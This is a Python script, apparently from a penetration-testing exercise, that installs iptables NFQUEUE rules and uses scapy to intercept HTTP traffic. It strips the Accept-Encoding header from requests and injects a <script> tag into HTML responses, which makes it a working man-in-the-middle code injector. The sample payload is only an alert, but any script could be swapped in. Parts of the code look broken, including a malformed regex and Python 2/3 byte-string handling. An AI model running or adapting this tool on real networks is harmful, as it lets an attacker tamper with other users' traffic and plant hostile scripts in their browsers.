#!/usr/bin/env python3

import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse
import re


def get_arguments():  # Function to get arguments in command line
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--choice', dest = "choice", help = "Choice for Intersystem Spoofing(1) and Intrasystem Spoofing(2)")
    options = parser.parse_args()
    if options.choice not in [1,2,"1","2"]:
        parser.error("[-] Please enter correct options for choice, use --help for more info")
    else:
        return options

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    # print scapy_packet.show()
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            #print "{+} HTTP Request > \n"
            print("[+] HTTP Request ")
            # print(scapy_packet.show())
            # Substituting the Accept-Encoding part to get plain HTML Code
            modified_load = re.sub("Accept-Encoding:*?\\r\\n", "", str(scapy_packet[scapy.Raw].load))
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(bytes(new_packet))

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            #print(scapy_packet.show())
            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('JS code');</script></body>")
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(bytes(new_packet))
    packet.accept()

try:
    options = get_arguments()
    choice = options.choice

    if(choice == 1 or choice == "1"): # Had to add "or" condition so that it supports both python2 and python3
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created IPTABLE for FORWARD\n")
    elif(choice == 2 or choice == "2"):
        subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell = True)
        subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created iptable for INPUT and OUTPUT\n")
    else:
        print("[-] Invalid Choice.... Exiting.....")
        exit()


    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C........ Exiting... ....")
    subprocess.call("iptables --flush", shell = True)
